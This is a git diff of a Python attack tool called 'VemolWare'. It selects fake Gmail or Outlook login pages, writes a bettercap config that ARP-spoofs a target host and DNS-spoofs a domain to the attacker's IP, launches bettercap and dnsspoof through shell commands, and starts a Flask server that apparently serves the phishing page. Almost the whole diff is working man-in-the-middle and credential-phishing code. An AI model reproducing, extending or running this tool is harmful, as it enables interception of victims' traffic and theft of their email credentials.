@@ -4,6 +4,7 @@ import logging
 import subprocess
 import socket
 import netifaces
+import json
 from optparse import OptionParser
 
 # import subprocess
@@ -15,6 +16,8 @@ DOMAIN_TARGET = {
     '1': 'gmail-login.html',
     '2': 'outlook-login.html',
 }
+
+LOCAL_IP = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr'] 
 
 class VemolWare:
     def __init__(self):
@@ -30,17 +33,10 @@ class VemolWare:
         parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')
         parser.add_option('-m', dest='mode', default='req', help='Poisoning mode: requests (req) or replies (rep) [default: %default]')
         (self.options, self.args) = parser.parse_args()
-
         # Check interface input is given
-        # if len(self.args) != 1 or self.options.interface == None:
-        #     parser.print_help()
-        #     sys.exit(0)
-        
-        # Check ipforwarding is OK
-        # if subprocess.run(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'], stdout=subprocess.PIPE).returncode != 0:
-        #     error = 'Failed to ipfowarding'
-        #     # loggin.error(error)
-        #     sys.exit(0)
+        if self.options.interface == None:
+            parser.print_help()
+            sys.exit(0)
 
         # Select target domain
         try:
@@ -57,20 +53,42 @@ class VemolWare:
             print("Sorry, I didn't understand that.")
             sys.exit(0)
 
+    def create_config_file_json(self):
+        data = {
+            'local_ip': netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr'],
+            'target': self.options.target,
+            'domain': self.option_domain
+        }
+        with open('config_w.json', 'w') as f:
+            json.dump(data, f)
+        f.close()
+    
+    def create_config_file_bettercap(self):
+        data = json.load(open('config_w.json'))
+        file = open('config_bettercap.txt','w') 
+        file.write(f'set arp.spoof.targets {self.options.target}\n')
+        file.write('arp.spoof on\n')
+        file.write(f'set dns.spoof.address {LOCAL_IP}\n')
+        file.write('set dns.spoof.domains www.vemol2.com\n')
+        file.write('dns.spoof on\n')
+        file.close()
 
     def check_requirements(self):
         pass
         # os.system('gnome-terminal -- ping 8.8.8.8')
 
     def arpspoof(self):
+        # Setiting up Arpspoof
         gws = netifaces.gateways()
         target = gws['default'][netifaces.AF_INET][0]
-        command = f'gnome-terminal -- arpspoof -i eth0 {target}'
+        command = f'gnome-terminal -- bettercap --caplet config_bettercap.txt'
         os.system(command)
     
-    def dnssniff (self, hosts_file):
-        pass
-        # os.system('gnome-terminal -- ping 8.8.8.8')
+    def dnssniff (self):
+        # Setting up Dnsspoof
+        # TODO: copiar el hosts a hosts_bak y meter en hosts ip -- 
+        command = f'gnome-terminal -- dnsspoof -i eth0 -f /etc/hosts'
+        os.system(command)
     
     def flask_server (self):
         # Starting Flask server targeting domain address
@@ -78,7 +96,10 @@ class VemolWare:
         os.system(command)
     
     def main(self):
+        self.create_config_file_bettercap()
         self.arpspoof()
+        #self.dnssniff()
+        self.flask_server()
 
 
 if __name__ == "__main__":
